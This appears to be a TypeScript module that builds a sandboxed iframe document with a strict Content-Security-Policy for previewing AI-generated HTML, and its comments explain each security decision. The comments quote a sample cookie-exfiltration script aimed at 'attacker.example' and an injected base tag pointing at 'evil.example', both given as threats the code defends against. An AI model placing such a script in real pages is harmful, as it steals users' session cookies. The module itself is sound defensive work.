/**
 * Building the `srcdoc` a preview runs in. Plan §4.
 *
 * PURE, and the security-critical half of the feature. Model-authored HTML
 * is untrusted input: the model can be talked into writing
 *
 *   <script>fetch('https://attacker.example/'+document.cookie)</script>
 *
 * and the page it lands on is ours. Two independent controls stop it:
 *
 *   1. the iframe's `sandbox` attribute WITHOUT `allow-same-origin`, which
 *      puts the document in an opaque origin (no cookies, no localStorage
 *      of our domain, no parent DOM) — see PREVIEW_SANDBOX below;
 *   2. the Content-Security-Policy prepended here, whose `connect-src
 *      'none'` means the frame cannot make a network request at all, so
 *      there is nothing to exfiltrate even if it reads something.
 *
 * Either alone would be a reasonable design. Both together is why a preview
 * can run a model's JavaScript without a second thought.
 */

/**
 * The iframe `sandbox` tokens. Plan §4.1.
 *
 * `allow-same-origin` IS THE ONE THAT MUST NEVER APPEAR. MDN on the sandbox
 * attribute, verbatim:
 *
 *   "When the embedded document has the same origin as the embedding page,
 *    it is strongly discouraged to use both allow-scripts and
 *    allow-same-origin, as that lets the embedded document remove the
 *    sandbox attribute — making it no more secure than not using the
 *    sandbox attribute at all."
 *
 * With the origin opaque, `allow-scripts` is safe: the script can run, and
 * there is nothing of ours within its reach.
 *
 * `allow-forms` and `allow-modals` are for legitimate demos (a form mockup,
 * an `alert()` in a tutorial); `form-action 'none'` in the CSP stops the
 * form from reaching any server. `allow-popups` is NOT granted — a popup
 * escapes the sandbox flags of its opener.
 */
export const PREVIEW_SANDBOX = 'allow-scripts allow-forms allow-modals allow-downloads';

/**
 * The CSP prepended to every preview. Plan §4.3.
 *
 * Line by line, because each one is a decision:
 *
 *   default-src 'none'      deny everything not named below
 *   style-src   inline + Google Fonts
 *                           inline styles are how a model writes CSS; fonts
 *                           are the one remote asset worth allowing
 *   script-src  'unsafe-inline'
 *                           the model's JS is inline by construction. Safe
 *                           only because the origin is opaque AND
 *                           connect-src is closed.
 *   img-src     data: blob: https:
 *                           data URIs cover generated charts; https covers
 *                           a legitimately referenced photo
 *   font-src    data: + gstatic
 *   connect-src 'none'      THE LOAD-BEARING LINE. No fetch, no XHR, no
 *                           WebSocket, no beacon. A preview cannot exfiltrate
 *                           what it can read, even to a server it controls.
 *   form-action 'none'      a form may be drawn; it may not submit
 *   base-uri    'none'      no injected <base> can retarget relative URLs
 */
export const PREVIEW_CSP = [
  "default-src 'none'",
  "style-src 'unsafe-inline' https://fonts.googleapis.com",
  "script-src 'unsafe-inline'",
  'img-src data: blob: https:',
  'font-src data: https://fonts.gstatic.com',
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
].join('; ') + ';';

/** Escape a value for insertion as HTML TEXT (used for the `<title>`). */
function escapeHtmlText(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

/**
 * The document a preview iframe receives.
 *
 * `srcdoc` needs a full document or the browser applies quirks mode, which
 * changes box-sizing and makes a perfectly good layout render wrong. So a
 * body-only fragment is wrapped; a full document is passed through with only
 * the CSP inserted.
 *
 * NO `<base>` IS EVER ADDED. `base-uri 'none'` forbids one, and an injected
 * `<base href="https://evil.example/">` would retarget every relative link
 * in the preview — exactly what that directive prevents.
 */
export function srcdocFor(html: string): string {
  const meta = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`;
  const trimmed = html.trimStart();

  // A full document: the meta goes immediately after <head>. A meta CSP is
  // only honoured when it precedes the resources it governs, so this is the
  // one position that works.
  const headOpen = /<head[^>]*>/i.exec(trimmed);
  if (headOpen) {
    const at = headOpen.index + headOpen[0].length;
    return `${trimmed.slice(0, at)}${meta}${trimmed.slice(at)}`;
  }

  // An <html> with no <head>: synthesise one.
  const htmlOpen = /<html[^>]*>/i.exec(trimmed);
  if (htmlOpen) {
    const at = htmlOpen.index + htmlOpen[0].length;
    return `${trimmed.slice(0, at)}<head>${meta}</head>${trimmed.slice(at)}`;
  }

  // A fragment. Wrap it so the browser is in standards mode and the CSP is
  // in effect from the first byte.
  return `<!DOCTYPE html><html><head><meta charset="utf-8">${meta}</head><body>${html}</body></html>`;
}

/**
 * The same document, for opening in a new tab.
 *
 * A new tab is NOT automatically safe — MDN: "Sandboxing is useless if the
 * attacker can display content outside a sandboxed iframe." A tab cannot
 * carry the iframe's `sandbox` attribute at all, so the only control that
 * survives is the CSP, and `connect-src 'none'` still holds. It is
 * deliberately the same builder: a second code path is a second place to
 * forget the meta tag.
 */
export function standaloneDocument(html: string): string {
  return srcdocFor(html);
}

/** Is a body too large to preview? Plan §11 rule 8. */
export function isTooLarge(content: string, max = 512 * 1024): boolean {
  return content.length > max;
}

/** The `title=` text for the iframe. Escaped; it is content, not markup. */
export function previewTitle(filename: string): string {
  return `Preview of ${escapeHtmlText(filename)}`;
}
